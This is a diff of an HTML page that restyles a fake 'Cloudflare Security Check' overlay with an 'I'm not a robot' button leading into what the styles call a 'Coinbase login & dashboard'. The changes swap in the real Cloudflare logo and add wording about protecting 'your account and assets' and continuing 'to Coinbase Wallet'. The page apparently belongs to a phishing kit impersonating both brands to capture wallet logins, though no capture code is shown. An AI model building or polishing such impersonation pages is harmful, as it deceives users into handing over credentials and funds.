@@ -11,12 +11,12 @@
       background: #f5f6fa;
       color: #222;
     }
-    /* Cloudflare overlay styles (from provided code) */
+    /* Cloudflare overlay - modernized */
     #cloudflare-verify-overlay {
       position: fixed;
       z-index: 2147483647;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: #fff;
+      background: linear-gradient(120deg,#e6eaff 0%,#ffffff 90%);
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -24,9 +24,9 @@
       transition: opacity 0.3s;
     }
     #cloudflare-verify-box {
-      background: #f7f7fb;
-      border-radius: 14px;
-      box-shadow: 0 4px 32px rgba(40,40,60,0.10);
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 8px 32px rgba(40,40,60,0.13);
       border: 1px solid #e0e4ea;
       padding: 2.8em 2.5em 2.4em 2.5em;
       min-width: 350px;
@@ -36,32 +36,37 @@
       display: flex;
       flex-direction: column;
       align-items: center;
+      animation: fadein 0.4s;
     }
+    @keyframes fadein {from{opacity:0;transform:translateY(22px);}to{opacity:1;transform:translateY(0);}}
+
     .cf-logo {
-      width: 110px;
-      margin-bottom: 1.6em;
+      width: 100px;
+      margin-bottom: 1.3em;
       display: block;
+      border-radius: 18px;
+      box-shadow: 0 2px 18px #e9eaff70;
     }
     .cf-lock {
-      color: #f38020;
-      font-size: 1.6em;
-      margin-bottom: 0.2em;
+      color: #3861fb;
+      font-size: 2.1em;
+      margin-bottom: 0.3em;
     }
     #cloudflare-verify-title {
-      font-size: 1.3em;
-      font-weight: 600;
-      color: #222;
-      letter-spacing: .02em;
-      margin-bottom: 0.7em;
+      font-size: 1.35em;
+      font-weight: 700;
+      color: #232a3d;
+      margin-bottom: 0.6em;
+      letter-spacing: .01em;
     }
     #cloudflare-verify-desc {
-      font-size: 1.06em;
-      color: #444;
+      font-size: 1.09em;
+      color: #384561;
       margin: 0.4em 0 2em 0;
       line-height: 1.5;
     }
     #cloudflare-challenge-btn {
-      background: linear-gradient(89deg, #f38020 0%, #f7b500 100%);
+      background: linear-gradient(90deg, #3861fb 0%, #41a5ff 100%);
       color: #fff;
       border: none;
       border-radius: 6px;
@@ -70,15 +75,15 @@
       font-weight: 600;
       cursor: pointer;
       margin-top: 0.7em;
-      box-shadow: 0 2px 8px #f3802016;
+      box-shadow: 0 2px 8px #3861fb18;
       transition: background 0.2s, box-shadow 0.2s;
       outline: none;
       position: relative;
     }
     #cloudflare-challenge-btn:active,
     #cloudflare-challenge-btn:focus {
-      background: linear-gradient(89deg, #f7b500 0%, #f38020 100%);
-      box-shadow: 0 2px 17px #f3802040;
+      background: linear-gradient(90deg, #41a5ff 0%, #3861fb 100%);
+      box-shadow: 0 2px 17px #3861fb24;
     }
     #cloudflare-spinner {
       display: none;
@@ -86,10 +91,10 @@
       margin-top: 1.6em;
       width: 36px; height: 36px;
       border-radius: 50%;
-      border: 4px solid #f38020;
+      border: 4px solid #3861fb;
       border-top: 4px solid #fff3e6;
       animation: spin 1s linear infinite;
-      border-left: 4px solid #f7b500;
+      border-left: 4px solid #41a5ff;
       border-bottom: 4px solid #fff3e6;
     }
     @keyframes spin {
@@ -101,6 +106,7 @@
     @media (max-width:400px) {
       #cloudflare-verify-box { padding: 1em 0.1em; }
     }
+
     /* Coinbase login & dashboard styles */
     #main-app {
       display: none;
@@ -297,7 +303,6 @@
       position: relative;
       animation: fadein 0.18s;
     }
-    @keyframes fadein {from{opacity:0;transform:translateY(22px);}to{opacity:1;transform:translateY(0);}}
     .cb-modal-close {
       position: absolute; top: 12px; right: 16px; background: none; border: none; font-size: 1.7em; color: #bbb; cursor: pointer;
       transition: color 0.15s;
@@ -335,17 +340,12 @@
   <!-- Cloudflare Verification Overlay -->
   <div id="cloudflare-verify-overlay" aria-modal="true" role="dialog" aria-labelledby="cloudflare-verify-title">
     <div id="cloudflare-verify-box">
-      <svg class="cf-logo" viewBox="0 0 180 40" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-        <ellipse cx="36" cy="20" rx="36" ry="16" fill="#F38020"/>
-        <ellipse cx="110" cy="30" rx="38" ry="10" fill="#F7B500"/>
-        <ellipse cx="148" cy="26" rx="20" ry="7" fill="#F38020"/>
-      </svg>
+      <img class="cf-logo" src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Cloudflare_Logo.png" alt="Cloudflare Logo" />
       <div class="cf-lock" aria-hidden="true">🔒</div>
-      <div id="cloudflare-verify-title">Cloudflare Verification</div>
+      <div id="cloudflare-verify-title">Cloudflare Security Check</div>
       <div id="cloudflare-verify-desc">
-        For security, please confirm you are not a robot.<br>
-        This quick check helps keep the Internet safe for everyone worldwide.<br>
-        Just click the button below to continue.
+        To protect your account and assets, please confirm you are not a robot.<br>
+        Click the button below to continue to Coinbase Wallet.
       </div>
       <button id="cloudflare-challenge-btn" aria-label="Confirm you are not a robot">I'm not a robot</button>
       <div id="cloudflare-spinner" aria-hidden="true"></div>
